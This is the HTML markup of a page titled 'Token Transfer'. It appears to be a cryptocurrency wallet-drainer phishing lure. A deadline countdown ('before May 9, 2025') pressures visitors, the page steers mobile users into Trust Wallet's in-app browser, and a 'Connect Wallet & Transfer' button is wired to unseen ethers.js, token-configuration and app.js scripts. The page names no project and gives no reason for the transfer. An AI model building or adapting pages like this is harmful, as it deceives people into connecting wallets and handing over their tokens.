<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Token Transfer</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="header">
        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Logo" class="logo">
        <h1>Token Transfer</h1>
        <p class="description">Transfer your tokens before May 9, 2025</p>
        
        <div class="countdown">
          <div class="countdown-item">
            <span id="days">00</span>
            <span>Days</span>
          </div>
          <div class="countdown-item">
            <span id="hours">00</span>
            <span>Hours</span>
          </div>
          <div class="countdown-item">
            <span id="minutes">00</span>
            <span>Mins</span>
          </div>
          <div class="countdown-item">
            <span id="seconds">00</span>
            <span>Secs</span>
          </div>
        </div>
      </div>
      
      <div class="mobile-warning">
        <i class="fas fa-mobile-alt"></i> For best experience on mobile, please use Trust Wallet's in-app browser
      </div>
      
      <div class="trust-container" id="trustContainer">
        <button id="openTrustWallet" class="trust-btn">
          <i class="fas fa-external-link-alt"></i> Open in Trust Wallet
        </button>
        <div class="manual-steps" id="manualSteps">
          <p><strong>If Trust Wallet didn't open automatically:</strong></p>
          <ol style="text-align: left; padding-left: 20px; margin-top: 10px;">
            <li>Open Trust Wallet app</li>
            <li>Tap the <strong>Browser</strong> tab</li>
            <li>Enter this URL: <span id="currentUrl" style="word-break: break-all;"></span></li>
          </ol>
        </div>
      </div>
      
      <div class="network-selector">
        <select id="networkSelect">
          <option value="ethereum">Ethereum</option>
          <option value="bsc">Binance Smart Chain</option>
          <option value="polygon">Polygon</option>
        </select>
      </div>
      
      <button id="connectWallet" class="btn">
        <i class="fas fa-wallet"></i> Connect Wallet & Transfer
      </button>
      <div id="loader" class="loader"></div>
      
      <div id="walletInfo" class="wallet-info"></div>
      <div id="status" class="status"></div>
    </div>
  </div>

  <!-- Load scripts in this exact order -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
  <script src="config/abi.js"></script>
  <script src="config/networks.js"></script>
  <script src="config/tokens.js"></script>
  <script src="app.js"></script>
</body>
</html>
